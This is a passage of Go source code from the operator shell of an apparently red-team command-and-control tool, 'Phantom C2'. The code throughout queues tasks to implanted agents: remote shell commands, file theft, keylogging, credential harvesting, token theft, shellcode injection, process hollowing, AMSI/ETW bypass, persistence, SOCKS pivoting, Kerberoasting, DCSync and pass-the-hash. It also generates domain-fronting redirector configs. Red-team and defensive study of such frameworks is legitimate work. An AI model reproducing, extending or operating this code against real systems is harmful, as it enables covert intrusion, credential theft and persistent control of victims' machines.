		fmt.Printf("  %s%sRedirector Configuration Generator%s\n", colorBold, colorPurple, colorReset)
		fmt.Printf("  %s──────────────────────────────────────────────────%s\n", colorDim, colorReset)
		fmt.Println()
		fmt.Printf("  %sUsage:%s redirector <domain> <c2_ip> [c2_port] [redir_port]\n", colorCyan, colorReset)
		fmt.Println()
		fmt.Printf("  %sExample:%s\n", colorYellow, colorReset)
		fmt.Printf("    redirector updates.example.com 10.0.0.5\n")
		fmt.Printf("    redirector cdn.company.com 10.0.0.5 8080 443\n")
		fmt.Println()
		fmt.Printf("  %sGenerates configs for:%s\n", colorYellow, colorReset)
		fmt.Printf("    • Nginx reverse proxy (with Let's Encrypt)\n")
		fmt.Printf("    • Apache mod_rewrite\n")
		fmt.Printf("    • Cloudflare Worker (domain fronting)\n")
		fmt.Printf("    • Caddy (auto-TLS)\n")
		fmt.Printf("    • socat (quick testing)\n")
		fmt.Printf("    • iptables (transparent)\n")
		fmt.Printf("    • Setup guide with OPSEC checklist\n")
		fmt.Println()
		return
	}

	cfg := listener.RedirectorConfig{
		RedirDomain: args[0],
		C2Host:      args[1],
		C2Port:      "8080",
		RedirPort:   "443",
	}
	if len(args) > 2 {
		cfg.C2Port = args[2]
	}
	if len(args) > 3 {
		cfg.RedirPort = args[3]
	}

	output, err := listener.GenerateRedirectorConfigs(cfg, "build/redirector")
	if err != nil {
		Error("Failed: %v", err)
		return
	}

	Success("Redirector configs generated for %s → %s:%s", cfg.RedirDomain, cfg.C2Host, cfg.C2Port)
	fmt.Println(output)
	fmt.Println()
	Info("Deploy the config on your redirector VPS")
	Info("Then build agents with: generate exe https://%s:%s", cfg.RedirDomain, cfg.RedirPort)
}

func (sh *Shell) cmdWebhook(args []string) {
	if len(args) < 2 {
		Info("Webhook notification setup:")
		fmt.Printf("    %swebhook slack <webhook_url>%s     Set Slack notifications\n", colorCyan, colorReset)
		fmt.Printf("    %swebhook discord <webhook_url>%s   Set Discord notifications\n", colorCyan, colorReset)
		fmt.Printf("    %swebhook test%s                    Send a test notification\n", colorCyan, colorReset)
		return
	}

	switch args[0] {
	case "slack":
		notifier := server.NewWebhookNotifier(args[1], "")
		sh.server.Webhook = notifier
		Success("Slack webhook configured")
		Info("Notifications will be sent for: agent registration, agent death, listener events")
	case "discord":
		notifier := server.NewWebhookNotifier("", args[1])
		sh.server.Webhook = notifier
		Success("Discord webhook configured")
		Info("Notifications will be sent for: agent registration, agent death, listener events")
	case "test":
		if sh.server.Webhook != nil {
			sh.server.Webhook.NotifyAgentRegistered("test-agent", "windows", "TEST-PC", "admin", "10.0.0.1")
			Success("Test notification sent")
		} else {
			Error("No webhook configured — use: webhook slack <url> or webhook discord <url>")
		}
	default:
		Error("Unknown webhook type: %s (use: slack, discord, test)", args[0])
	}
}

func (sh *Shell) cmdVersion() {
	fmt.Println()
	fmt.Printf("  %s%sPhantom C2 Framework%s\n", colorBold, colorPurple, colorReset)
	fmt.Printf("  %s─────────────────────────────────%s\n", colorDim, colorReset)
	fmt.Printf("  %-15s %s\n", "Version:", "1.0.0")
	fmt.Printf("  %-15s %s\n", "Go:", runtime.Version())
	fmt.Printf("  %-15s %s/%s\n", "Platform:", runtime.GOOS, runtime.GOARCH)
	fmt.Printf("  %-15s %s\n", "Repo:", "github.com/Phantom-C2-77/Phantom")
	fmt.Printf("  %-15s %s\n", "Author:", "Opeyemi Kolawole")
	fmt.Printf("  %-15s %s\n", "License:", "BSD 3-Clause")
	fmt.Println()
}

func (sh *Shell) cmdEvents() {
	if len(sh.server.EventLog) == 0 {
		Warn("No events recorded")
		return
	}

	fmt.Println()
	for _, e := range sh.server.EventLog {
		fmt.Printf("  %s%s%s\n", colorDim, e, colorReset)
	}
}

// ─────────────── Agent Commands ───────────────

func (sh *Shell) cmdAgentHelp() {
	name := sh.activeAgent.Name
	os := sh.activeAgent.OS

	fmt.Println()
	fmt.Printf("  %s%s╔══════════════════════════════════════════════════════════╗%s\n", colorBold, colorCyan, colorReset)
	fmt.Printf("  %s%s║        ⚔️  AGENT COMMANDS — %-25s  ║%s\n", colorBold, colorCyan, name, colorReset)
	fmt.Printf("  %s%s╚══════════════════════════════════════════════════════════╝%s\n", colorBold, colorCyan, colorReset)
	fmt.Println()

	sections := []struct {
		title string
		icon  string
		cmds  [][]string
	}{
		{"Recon & Info", "🔍", [][]string{
			{"shell <command>", "Execute a shell command"},
			{"sysinfo", "System / device information"},
			{"ps", "List running processes"},
			{"ifconfig", "Network interfaces"},
			{"cd <path>", "Change directory"},
			{"info", "Show agent details"},
			{"tasks", "Task history for this agent"},
		}},
		{"File Operations", "📁", [][]string{
			{"upload <local> <remote>", "Upload file to agent"},
			{"download <path>", "Download file from agent"},
			{"screenshot", "Capture screen"},
		}},
	}

	// Mobile-specific commands
	if os == "android" || os == "ios" {
		sections = append(sections, struct {
			title string
			icon  string
			cmds  [][]string
		}{"Mobile", "📱", [][]string{
			{"location", "GPS / cell location"},
			{"clipboard", "Clipboard contents"},
			{"fileget <path>", "Base64 file download"},
		}})
	}

	// Windows/Linux commands
	if os == "windows" || os == "linux" {
		sections = append(sections, struct {
			title string
			icon  string
			cmds  [][]string
		}{"Execution", "💉", [][]string{
			{"assembly <path> [args]", ".NET assembly (Seatbelt, Rubeus)"},
			{"bof <file> [args]", "Beacon Object File (in-memory)"},
			{"shellcode <file>", "Raw shellcode injection"},
			{"inject <pid> <file>", "Remote process injection"},
			{"hollow <exe> <file>", "Process hollowing"},
		}})
	}

	sections = append(sections, struct {
		title string
		icon  string
		cmds  [][]string
	}{"Credential Access", "🔑", [][]string{
		{"creds <all|browser|wifi>", "Harvest credentials"},
		{"token <steal|make|revert>", "Token manipulation (Windows)"},
		{"keylog [seconds]", "Keylogger (default: 30s)"},
	}})

	if os == "windows" || os == "linux" {
		sections = append(sections, struct {
			title string
			icon  string
			cmds  [][]string
		}{"Lateral & Pivoting", "🔀", [][]string{
			{"lateral wmiexec <ip> ...", "WMI execution"},
			{"lateral winrm <ip> ...", "WinRM execution"},
			{"socks <start|stop|list>", "SOCKS5 proxy"},
			{"portfwd <local> <remote>", "TCP port forward"},
			{"pivot <start|stop|list>", "SMB/socket relay"},
		}})

		sections = append(sections, struct {
			title string
			icon  string
			cmds  [][]string
		}{"Evasion & Persistence", "🛡️", [][]string{
			{"evasion", "AMSI/ETW bypass + ntdll unhook"},
			{"persist <method>", "Install persistence (12 methods)"},
			{"sleep <sec> [jitter%]", "Change beacon interval"},
		}})

		sections = append(sections, struct {
			title string
			icon  string
			cmds  [][]string
		}{"Active Directory", "🏰", [][]string{
			{"ad-enum-users", "Enumerate domain users"},
			{"ad-enum-groups", "Enumerate domain groups"},
			{"ad-enum-computers", "Enumerate domain computers"},
			{"ad-enum-spns", "Find SPNs (Kerberoast)"},
			{"ad-help", "Full AD command reference"},
		}})
	}

	sections = append(sections, struct {
		title string
		icon  string
		cmds  [][]string
	}{"Session", "⚙️", [][]string{
		{"back", "Return to main menu"},
		{"kill", "Terminate the agent"},
	}})

	for _, s := range sections {
		fmt.Printf("  %s%s %s %s%s\n", colorBold+colorYellow, s.icon, s.title, colorReset, "")
		for _, c := range s.cmds {
			fmt.Printf("    %s%-28s%s %s%s%s\n", colorCyan, c[0], colorReset, colorDim, c[1], colorReset)
		}
		fmt.Println()
	}
}

func (sh *Shell) cmdAgentInfo() {
	a := sh.activeAgent

	osIcon := "🐧"
	switch a.OS {
	case "windows":
		osIcon = "🪟"
	case "android":
		osIcon = "📱"
	case "ios":
		osIcon = "🍎"
	}

	statusColor := colorGreen
	statusDot := "●"
	if a.Status == "dormant" {
		statusColor = colorYellow
		statusDot = "◐"
	} else if a.Status == "dead" {
		statusColor = colorRed
		statusDot = "○"
	}

	fmt.Println()
	fmt.Printf("  %s%s╔══════════════════════════════════════════╗%s\n", colorBold, colorCyan, colorReset)
	fmt.Printf("  %s%s║  %s  %-36s  ║%s\n", colorBold, colorCyan, osIcon, a.Name, colorReset)
	fmt.Printf("  %s%s╚══════════════════════════════════════════╝%s\n", colorBold, colorCyan, colorReset)
	fmt.Println()
	fmt.Printf("  %s%s  ID%s          %s%s%s\n", colorBold, colorDim, colorReset, colorPurple, a.ID, colorReset)
	fmt.Printf("  %s%s  Hostname%s    %s%s%s\n", colorBold, colorDim, colorReset, colorWhite, a.Hostname, colorReset)
	fmt.Printf("  %s%s  Username%s    %s%s%s\n", colorBold, colorDim, colorReset, colorWhite, a.Username, colorReset)
	fmt.Printf("  %s%s  OS / Arch%s   %s%s / %s%s\n", colorBold, colorDim, colorReset, colorCyan, a.OS, a.Arch, colorReset)
	fmt.Printf("  %s%s  Process%s     %s%s%s (PID %d)\n", colorBold, colorDim, colorReset, colorWhite, a.ProcessName, colorReset, a.PID)
	fmt.Printf("  %s%s  Internal%s    %s%s%s\n", colorBold, colorDim, colorReset, colorCyan, a.InternalIP, colorReset)
	fmt.Printf("  %s%s  External%s    %s%s%s\n", colorBold, colorDim, colorReset, colorCyan, a.ExternalIP, colorReset)
	fmt.Printf("  %s%s  Sleep%s       %s%ds%s / %s%d%%%s jitter\n", colorBold, colorDim, colorReset, colorYellow, a.Sleep, colorReset, colorYellow, a.Jitter, colorReset)
	fmt.Printf("  %s%s  First Seen%s  %s%s%s\n", colorBold, colorDim, colorReset, colorDim, util.FormatTimestamp(a.FirstSeen), colorReset)
	fmt.Printf("  %s%s  Last Seen%s   %s%s%s (%s)\n", colorBold, colorDim, colorReset, colorWhite, util.FormatTimestamp(a.LastSeen), colorReset, util.TimeAgo(a.LastSeen))
	fmt.Printf("  %s%s  Status%s      %s%s %s%s\n", colorBold, colorDim, colorReset, statusColor, statusDot, a.Status, colorReset)
	fmt.Println()
}

func (sh *Shell) queueTask(taskType uint8, args []string, data []byte) {
	task, err := sh.server.TaskDisp.CreateTask(sh.activeAgent.ID, taskType, args, data)
	if err != nil {
		Error("Failed to create task: %v", err)
		return
	}
	Success("Task queued (ID: %s) — waiting for agent check-in...", util.ShortID(task.ID))
}

func (sh *Shell) cmdShell(args []string) {
	if len(args) == 0 {
		Error("Usage: shell <command>")
		return
	}
	sh.queueTask(protocol.TaskShell, args, nil)
}

func (sh *Shell) cmdUpload(args []string) {
	if len(args) < 2 {
		Error("Usage: upload <local-path> <remote-path>")
		return
	}

	data, err := os.ReadFile(args[0])
	if err != nil {
		Error("Failed to read file: %v", err)
		return
	}

	sh.queueTask(protocol.TaskUpload, []string{args[1]}, data)
	Info("File size: %d bytes", len(data))
}

func (sh *Shell) cmdDownload(args []string) {
	if len(args) == 0 {
		Error("Usage: download <remote-path>")
		return
	}
	sh.queueTask(protocol.TaskDownload, args, nil)
}

func (sh *Shell) cmdScreenshot() {
	sh.queueTask(protocol.TaskScreenshot, nil, nil)
}

func (sh *Shell) cmdProcessList() {
	sh.queueTask(protocol.TaskProcessList, nil, nil)
}

func (sh *Shell) cmdSysinfo() {
	sh.queueTask(protocol.TaskSysinfo, nil, nil)
}

func (sh *Shell) cmdIfconfig() {
	sh.queueTask(protocol.TaskIfconfig, nil, nil)
}

func (sh *Shell) cmdPersist(args []string) {
	if len(args) == 0 {
		Error("Usage: persist <method>")
		Info("Methods: registry, cron, service, bashrc, schtask")
		return
	}
	sh.queueTask(protocol.TaskPersist, args, nil)
}

func (sh *Shell) cmdSleep(args []string) {
	if len(args) == 0 {
		Error("Usage: sleep <seconds> [jitter%%]")
		return
	}

	sleep, err := strconv.Atoi(args[0])
	if err != nil || sleep < 1 {
		Error("Invalid sleep value")
		return
	}

	jitter := sh.activeAgent.Jitter
	if len(args) > 1 {
		j, err := strconv.Atoi(args[1])
		if err == nil && j >= 0 && j <= 50 {
			jitter = j
		}
	}

	sh.server.AgentMgr.UpdateSleep(sh.activeAgent.ID, sleep, jitter)
	sh.queueTask(protocol.TaskSleep, []string{args[0], strconv.Itoa(jitter)}, nil)
	Success("Sleep set to %ds with %d%% jitter", sleep, jitter)
}

func (sh *Shell) cmdCd(args []string) {
	if len(args) == 0 {
		Error("Usage: cd <path>")
		return
	}
	sh.queueTask(protocol.TaskCd, args, nil)
}

func (sh *Shell) cmdKill() {
	answer, err := sh.liner.Prompt("  [!] This will terminate the agent. Are you sure? (y/N): ")
	if err == nil && strings.ToLower(strings.TrimSpace(answer)) == "y" {
		sh.queueTask(protocol.TaskKill, nil, nil)
		Warn("Kill task queued — agent will terminate on next check-in")
		sh.activeAgent = nil
	}
}

func (sh *Shell) cmdAgentTasks() {
	tasks, err := sh.server.TaskDisp.GetTaskHistory(sh.activeAgent.ID)
	if err != nil {
		Error("Failed to get tasks: %v", err)
		return
	}

	if len(tasks) == 0 {
		Warn("No tasks for this agent")
		return
	}

	t := NewTable("ID", "Type", "Args", "Status", "Created")
	for _, task := range tasks {
		argsStr := strings.Join(task.Args, " ")
		if len(argsStr) > 35 {
			argsStr = argsStr[:32] + "..."
		}

		t.AddRow(
			util.ShortID(task.ID),
			protocol.TaskTypeName(uint8(task.Type)),
			argsStr,
			protocol.StatusName(uint8(task.Status)),
			util.TimeAgo(task.CreatedAt),
		)
	}
	fmt.Println()
	t.Render()

	// Show latest result if available
	if len(tasks) > 0 && tasks[0].Status == int(protocol.StatusComplete) {
		result, _ := sh.server.TaskDisp.GetResult(tasks[0].ID)
		if result != nil && len(result.Output) > 0 {
			fmt.Printf("\n  %sLatest result:%s\n", colorDim, colorReset)
			fmt.Printf("  %s\n", string(result.Output))
		}
	}
}

func (sh *Shell) cmdShellcode(args []string) {
	if len(args) == 0 {
		Error("Usage: shellcode <bin-file>")
		Info("Executes raw shellcode in the agent's process memory (no disk touch)")
		return
	}

	data, err := os.ReadFile(args[0])
	if err != nil {
		Error("Failed to read shellcode file: %v", err)
		return
	}

	sh.queueTask(protocol.TaskShellcode, nil, data)
	Info("Shellcode size: %d bytes (in-memory execution)", len(data))
}

func (sh *Shell) cmdInject(args []string) {
	if len(args) < 2 {
		Error("Usage: inject <pid> <shellcode-file>")
		Info("Injects shellcode into a remote process (Windows: CreateRemoteThread)")
		return
	}

	data, err := os.ReadFile(args[1])
	if err != nil {
		Error("Failed to read shellcode file: %v", err)
		return
	}

	sh.queueTask(protocol.TaskInject, []string{args[0]}, data)
	Info("Injecting %d bytes into PID %s", len(data), args[0])
}

func (sh *Shell) cmdHollow(args []string) {
	if len(args) < 2 {
		Error("Usage: hollow <host-exe> <shellcode-file>")
		Info("Example: hollow C:\\Windows\\System32\\svchost.exe /path/to/payload.bin")
		Info("Spawns the host process suspended, injects payload, and resumes")
		return
	}

	data, err := os.ReadFile(args[1])
	if err != nil {
		Error("Failed to read shellcode file: %v", err)
		return
	}

	sh.queueTask(protocol.TaskHollow, []string{args[0]}, data)
	Info("Hollowing %s with %d bytes payload", args[0], len(data))
}

func (sh *Shell) cmdEvasion() {
	Info("Re-running evasion techniques on agent (AMSI, ETW, ntdll unhook)...")
	sh.queueTask(protocol.TaskEvasion, nil, nil)
}

func (sh *Shell) cmdPivot(args []string) {
	if len(args) == 0 {
		Error("Usage: pivot <start|stop|list> [pipe-name]")
		Info("Starts an SMB named pipe (Windows) or Unix socket (Linux) relay")
		Info("Internal agents connect through the relay for pivoting")
		Info("")
		Info("Examples:")
		fmt.Printf("    %spivot start%s              Start relay with default pipe name\n", colorCyan, colorReset)
		fmt.Printf("    %spivot start customname%s    Start relay with custom name\n", colorCyan, colorReset)
		fmt.Printf("    %spivot list%s                List active pivots\n", colorCyan, colorReset)
		fmt.Printf("    %spivot stop%s                Stop the relay\n", colorCyan, colorReset)
		return
	}
	sh.queueTask(protocol.TaskPivot, args, nil)
}

func (sh *Shell) cmdToken(args []string) {
	if len(args) == 0 {
		Info("Token manipulation commands:")
		fmt.Printf("    %stoken steal <pid>%s              Steal token from process\n", colorCyan, colorReset)
		fmt.Printf("    %stoken make <domain> <user> <pass>%s  Create logon token\n", colorCyan, colorReset)
		fmt.Printf("    %stoken revert%s                   Revert to original token\n", colorCyan, colorReset)
		fmt.Printf("    %stoken info%s                     Show current token info\n", colorCyan, colorReset)
		fmt.Printf("    %stoken priv <name>%s              Enable privilege\n", colorCyan, colorReset)
		return
	}
	sh.queueTask(protocol.TaskToken, args, nil)
}

func (sh *Shell) cmdKeylog(args []string) {
	duration := "30"
	if len(args) > 0 {
		duration = args[0]
	}
	Info("Starting keylogger for %ss...", duration)
	sh.queueTask(protocol.TaskKeylog, []string{duration}, nil)
}

func (sh *Shell) cmdSocks(args []string) {
	if len(args) == 0 {
		Info("SOCKS5 proxy commands:")
		fmt.Printf("    %ssocks start [port]%s     Start C2-tunneled SOCKS5 on your machine\n", colorCyan, colorReset)
		fmt.Printf("    %ssocks stop%s              Stop SOCKS5 tunnel\n", colorCyan, colorReset)
		fmt.Printf("    %ssocks list%s              Show active tunnels\n", colorCyan, colorReset)
		fmt.Println()
		Info("After starting, configure proxychains:")
		fmt.Printf("    echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf\n")
		fmt.Printf("    proxychains nmap -sT -Pn <internal_network>\n")
		return
	}

	switch args[0] {
	case "start":
		if sh.activeAgent == nil {
			Error("No agent selected. Use: interact <agent>")
			return
		}
		bind := "127.0.0.1:1080"
		if len(args) > 1 {
			bind = "127.0.0.1:" + args[1]
		}
		msg, err := sh.server.TunnelMgr.StartSOCKSTunnel(sh.server, sh.activeAgent.ID, sh.activeAgent.Name, bind)
		if err != nil {
			Error("SOCKS tunnel failed: %v", err)
		} else {
			Success("%s", msg)
		}
	case "stop":
		if sh.activeAgent == nil {
			Error("No agent selected")
			return
		}
		if err := sh.server.TunnelMgr.StopSOCKSTunnel(sh.activeAgent.ID); err != nil {
			Error("%v", err)
		} else {
			Success("SOCKS tunnel stopped")
		}
	case "list":
		tunnels := sh.server.TunnelMgr.ListTunnels()
		if len(tunnels) == 0 {
			Warn("No active tunnels")
			return
		}
		t := NewTable("Agent", "Bind Address", "Connections")
		for _, tun := range tunnels {
			t.AddRow(tun["agent"], tun["bind"], tun["connections"])
		}
		fmt.Println()
		t.Render()
	default:
		// Fall back to agent-side socks (legacy)
		sh.queueTask(protocol.TaskSocks, args, nil)
	}
}

func (sh *Shell) cmdPortFwd(args []string) {
	if len(args) < 2 {
		Error("Usage: portfwd <local_addr> <remote_addr>")
		Info("Example: portfwd 127.0.0.1:8888 10.0.1.5:3389")
		return
	}
	sh.queueTask(protocol.TaskPortFwd, args, nil)
}

func (sh *Shell) cmdAssembly(args []string) {
	if len(args) == 0 {
		Info(".NET Assembly Execution:")
		fmt.Printf("    %sassembly <path> [args]%s          Execute .NET assembly from file\n", colorCyan, colorReset)
		fmt.Printf("    %sassembly inline <base64> [args]%s Execute from base64 (in-memory)\n", colorCyan, colorReset)
		fmt.Printf("    %sassembly list%s                   List common assemblies\n", colorCyan, colorReset)
		fmt.Println()
		Info("Examples:")
		fmt.Printf("    assembly C:\\Windows\\Temp\\Seatbelt.exe -group=all\n")
		fmt.Printf("    assembly C:\\Windows\\Temp\\Rubeus.exe kerberoast\n")
		fmt.Printf("    assembly C:\\Windows\\Temp\\SharpHound.exe -c All\n")
		fmt.Printf("    assembly C:\\Windows\\Temp\\Certify.exe find /vulnerable\n")
		return
	}

	// Check if user wants to upload a local file first
	if args[0] != "inline" && args[0] != "list" {
		localPath := args[0]
		// If it's a local file path, read and upload it
		if data, err := os.ReadFile(localPath); err == nil {
			remotePath := "C:\\Windows\\Temp\\" + filepath.Base(localPath)
			Info("Uploading %s to %s...", filepath.Base(localPath), remotePath)
			sh.queueTask(protocol.TaskUpload, []string{remotePath}, data)

			// Wait briefly then execute
			Info("Executing assembly: %s %s", remotePath, strings.Join(args[1:], " "))
			execArgs := append([]string{remotePath}, args[1:]...)
			sh.queueTask(protocol.TaskAssembly, execArgs, nil)
			return
		}
	}

	sh.queueTask(protocol.TaskAssembly, args, nil)
}

func (sh *Shell) cmdCreds(args []string) {
	target := "all"
	if len(args) > 0 {
		target = args[0]
	}
	Info("Harvesting credentials (%s)...", target)
	sh.queueTask(protocol.TaskCreds, []string{target}, nil)
}

func (sh *Shell) cmdAD(cmd string, args []string) {
	if cmd == "ad-help" {
		sh.cmdADHelp()
		return
	}
	sh.queueTask(protocol.TaskAD, append([]string{cmd}, args...), nil)
}

func (sh *Shell) cmdADHelp() {
	fmt.Println()
	fmt.Printf("  %s%sActive Directory Commands%s\n", colorBold, colorPurple, colorReset)
	fmt.Printf("  %s─────────────────────────────────────────────────────────%s\n", colorDim, colorReset)
	fmt.Println()

	sections := []struct {
		title string
		cmds  [][]string
	}{
		{"Enumeration", [][]string{
			{"ad-enum-domain", "Enumerate domain info (DCs, forest)"},
			{"ad-enum-users [user]", "Enumerate domain users"},
			{"ad-enum-groups [group]", "Enumerate groups and memberships"},
			{"ad-enum-computers", "Enumerate domain computers"},
			{"ad-enum-shares [target]", "Enumerate SMB shares"},
			{"ad-enum-spns", "Enumerate SPNs (Kerberoastable)"},
			{"ad-enum-gpo", "Enumerate Group Policy Objects"},
			{"ad-enum-trusts", "Enumerate domain trusts"},
			{"ad-enum-admins", "Enumerate Domain/Enterprise Admins"},
			{"ad-enum-asrep", "Find AS-REP roastable accounts"},
			{"ad-enum-delegation", "Find delegation configurations"},
			{"ad-enum-laps", "Read LAPS passwords (if permitted)"},
		}},
		{"Attacks", [][]string{
			{"ad-kerberoast", "Request TGS tickets for SPN accounts"},
			{"ad-asreproast", "AS-REP Roast (no preauth accounts)"},
			{"ad-dcsync <DOMAIN/user>", "DCSync password replication (DA required)"},
		}},
		{"Credential Access", [][]string{
			{"ad-dump-sam", "Dump SAM database hives"},
			{"ad-dump-lsa", "Dump LSA secrets"},
			{"ad-dump-tickets", "Dump Kerberos tickets"},
		}},
		{"Lateral Movement", [][]string{
			{"ad-psexec <target> <cmd>", "PsExec remote execution"},
			{"ad-wmi <target> <cmd>", "WMI remote execution"},
			{"ad-winrm <target> <cmd>", "WinRM remote execution"},
			{"ad-pass-the-hash <t> <u> <h>", "Pass-the-Hash authentication"},
		}},
	}

	for _, section := range sections {
		fmt.Printf("  %s%s%s\n", colorYellow, section.title, colorReset)
		for _, c := range section.cmds {
			fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, c[0], colorReset, colorDim, c[1], colorReset)
		}
		fmt.Println()
	}
}

func (sh *Shell) cmdBOF(args []string) {
	if len(args) == 0 {
		Error("Usage: bof <object-file> [args...]")
		Info("Example: bof /path/to/whoami.o")
		return
	}

	// Read BOF file
	data, err := os.ReadFile(args[0])
	if err != nil {
		Error("Failed to read BOF file: %v", err)
		return
	}

	bofArgs := args[1:]
	sh.queueTask(protocol.TaskBOF, bofArgs, data)
	Info("BOF size: %d bytes", len(data))
}

// onEvent handles real-time events from the server.
func (sh *Shell) onEvent(event string, args ...interface{}) {
	timestamp := time.Now().Format("15:04:05")

	switch event {
	case "agent_register":
		fmt.Printf("\r  %s[%s]%s %s%s New agent: %v%s\n", colorGreen, timestamp, colorReset, colorBold, colorGreen, args, colorReset)
		sh.printPrompt()
	case "task_result":
		if len(args) >= 2 {
			taskID, _ := args[1].(string)
			agentID, _ := args[0].(string)

			// Look up the task result
			result, _ := sh.server.TaskDisp.GetResult(taskID)
			if result != nil && (len(result.Output) > 0 || result.Error != "") {
				// Get agent name for display
				agentName := util.ShortID(agentID)
				a, _ := sh.server.AgentMgr.Get(agentID)
				if a != nil {
					agentName = a.Name
				}

				// Get the task to show what command was run
				tasks, _ := sh.server.TaskDisp.GetTaskHistory(agentID)
				taskDesc := ""
				for _, t := range tasks {
					if t.ID == taskID {
						taskDesc = protocol.TaskTypeName(uint8(t.Type))
						if len(t.Args) > 0 {
							taskDesc += " " + strings.Join(t.Args, " ")
						}
						break
					}
				}

				fmt.Printf("\r\n")
				fmt.Printf("  %s[%s]%s %sResult from %s%s — %s\n", colorGreen, timestamp, colorReset, colorBold, agentName, colorReset, taskDesc)

				if result.Error != "" {
					fmt.Printf("  %s[-] Error: %s%s\n", colorRed, result.Error, colorReset)
					sh.logOutput("Error: " + result.Error)
				} else {
					output := string(result.Output)
					lines := strings.Split(strings.TrimRight(output, "\n"), "\n")
					for _, line := range lines {
						fmt.Printf("  %s%s%s\n", colorWhite, line, colorReset)
					}
					sh.logOutput(output)
				}
			} else {
				fmt.Printf("\r  %s[%s]%s Task result received (ID: %s)\n", colorCyan, timestamp, colorReset, util.ShortID(taskID))
			}
		}
		sh.printPrompt()
	case "listener_start":
		fmt.Printf("\r  %s[%s]%s Listener %v started (%v on %v)\n", colorGreen, timestamp, colorReset, args[0], args[1], args[2])
	case "listener_stop":
		fmt.Printf("\r  %s[%s]%s Listener %v stopped\n", colorYellow, timestamp, colorReset, args[0])
	case "listener_error":
		fmt.Printf("\r  %s[%s]%s %sListener %v error: %v%s\n", colorRed, timestamp, colorReset, colorRed, args[0], args[1], colorReset)
	}
}
